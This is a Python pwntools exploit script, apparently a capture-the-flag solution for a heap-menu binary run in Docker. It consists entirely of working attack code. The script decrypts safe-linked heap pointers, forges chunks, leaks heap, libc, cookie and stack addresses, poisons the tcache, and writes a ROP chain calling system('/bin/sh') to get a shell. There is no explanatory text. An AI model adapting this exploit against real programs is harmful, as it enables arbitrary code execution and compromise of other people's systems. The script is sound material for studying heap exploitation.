#!/usr/bin/env python3

import os

from pwn import process, p64, u64, remote, gdb


chunk_id = 0

def do_malloc(io, size: int, data: bytes, endline: bool = True) -> None:
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b': ', str(size).encode())

    if endline:
        io.sendlineafter(b': ', data)
    else:
        io.sendafter(b': ', data)

    global chunk_id
    print(f'   chunk #{chunk_id} allocated')
    chunk_id += 1


def do_free(io, id: int) -> None:
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b': ', str(id).encode())

    print(f'   chunk #{id} freed')


def do_view(io, id: int) -> bytes:
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b': ', str(id).encode())

    data = io.recvuntil(b'1. Add')

    return data[:-len(b'1. Add')]


def do_exit(io) -> None:
    io.sendlineafter(b'> ', b'4')


def decrypt_pointer(leak: int) -> int:
    parts = []

    parts.append((leak >> 36) << 36)
    parts.append((((leak >> 24) & 0xFFF) ^ (parts[0] >> 36)) << 24)
    parts.append((((leak >> 12) & 0xFFF) ^ ((parts[1] >> 24) & 0xFFF)) << 12)

    return parts[0] | parts[1] | parts[2]

"""
0x00000005607b343d	
0x00005602d338e60a
"""

def main():
    #os.system('kill -9 $(pgrep main)')
    io = process('docker run --rm -i gracious_davinci', shell=True)
    # io = remote('localhost', 17001)

    do_malloc(io, 24, b'x')
    do_malloc(io, 24, b'x')
    do_malloc(io, 24, b'x')

    do_free(io, 0)
    do_free(io, 1)

    do_malloc(io, 100, b'y')
    do_malloc(io, 24, b'')

    leak = do_view(io, 4)
    address = u64(leak[:8]) & (~0xFFF)
    heap_base = decrypt_pointer(address)
    print(f'heap_base @ 0x{heap_base:x}')

    gdb.attach(io, gdbscript="""
source ~/Downloads/pwndbg/gdbinit.py
    """)

    fake_chunk = [
        p64(0), p64(0x521),
        p64(0x4141414141414141), p64(0x4242424242424242),
    ]
    fake_chunk_ptr = heap_base + 0x3e0

    do_malloc(io, 64, b''.join(fake_chunk), False)

    do_malloc(io, 64, b'')
    do_malloc(io, 64, b'')
    do_malloc(io, 64, b'')
    do_malloc(io, 64, b'')

    do_free(io, 6)
    do_free(io, 7)
    do_free(io, 8)

    do_malloc(io, 24, p64(12345) + p64(1) + p64(fake_chunk_ptr))

    for _ in range(7):
        do_malloc(io, 88, (p64(0) + p64(0x21)) * 5, False)

    do_free(io, 7)

    leak = do_view(io, 5)
    libc_base = u64(leak[16:24]) - 0x219ce0
    print(f'libc_base @ 0x{libc_base:x}')

    ret = libc_base + 0x2a3e6
    binsh = libc_base + 0x1d8698
    system = libc_base + 0x50d60
    pop_rdi = libc_base + 0x2a3e5
    environ = libc_base + 0x221200

    leak = do_view(io, 8)
    cookie = u64(leak[8:16])
    print(f'cookie @ 0x{cookie:x}')

    do_malloc(io, 24, b'z')
    do_malloc(io, 24, b'z')

    do_free(io, 19)
    do_free(io, 20)

    do_malloc(io, 24, p64(1001) + p64(1) + p64(environ), False)

    leak = do_view(io, 6)
    stack = u64(leak[:8]) - 0x138
    print(f'stack @ 0x{stack:x}')

    payload = [
        p64(0x4142414241424142), p64(0),
        p64(0), p64(0x61),
        p64((heap_base >> 12) ^ stack), p64(cookie),
    ]

    do_malloc(io, 70, b''.join(payload), False)

    do_free(io, 19)
    do_free(io, 20)

    fake_chunk = heap_base + 0x540
    do_malloc(io, 24, p64(1001) + p64(1) + p64(fake_chunk), False)

    do_free(io, 6)
    do_free(io, 21)

    do_malloc(io, 88, b'zbeba')
    do_malloc(io, 88, b'zbeba')

    do_free(io, 23)
    do_free(io, 24)

    payload = [
        p64(0x4142414241424142), p64(0),
        p64(0), p64(0x61),
        p64((heap_base >> 12) ^ stack), p64(cookie + 1),
    ]

    do_malloc(io, 70, b''.join(payload), False)

    do_free(io, 25)

    do_free(io, 21)
    do_malloc(io, 24, p64(1001) + p64(1) + p64(fake_chunk), False)

    do_free(io, 21)

    payload = [
        p64(0x4142414241424142), p64(0),
        p64(0), p64(0x61),
        p64((heap_base >> 12) ^ stack), p64(cookie),
    ]

    do_malloc(io, 70, b''.join(payload), False)

    do_malloc(io, 88, b'AAAA')
    do_malloc(io, 88, b'+' * 8 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system), False)

    io.interactive()


if __name__ == '__main__':
    main()
